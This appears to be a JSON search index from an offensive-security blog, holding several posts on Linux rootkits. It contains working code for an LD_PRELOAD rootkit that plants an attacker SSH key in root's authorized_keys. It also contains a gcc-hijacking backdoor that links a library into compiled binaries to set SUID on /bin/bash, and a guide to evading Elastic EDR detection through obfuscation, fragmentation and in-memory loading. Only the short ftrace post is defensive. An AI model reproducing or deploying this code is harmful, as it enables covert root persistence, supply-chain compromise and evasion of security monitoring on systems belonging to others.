href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security has evolved dramatically. eBPF-based security solutions like Falco, Tracee, Tetragon, and others promised a new era of kernel-level observability that would make rootkits obsolete. The premise was compelling: if you can see everything happening in the kernel, attackers have nowhere to hide.\u003c/p\u003e\n\u003cp\u003eThat premise was wrong.\u003c/p\u003e\n\u003cp\u003eThis article demonstrates how a kernel module with root privileges can systematically blind eBPF security tools by hooking the very mechanisms they rely on for observability. We present a comprehensive analysis of how modern rootkits can intercept BPF iterators, ringbuffers, perf events, and map operations to become completely invisible to runtime security monitoring.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill 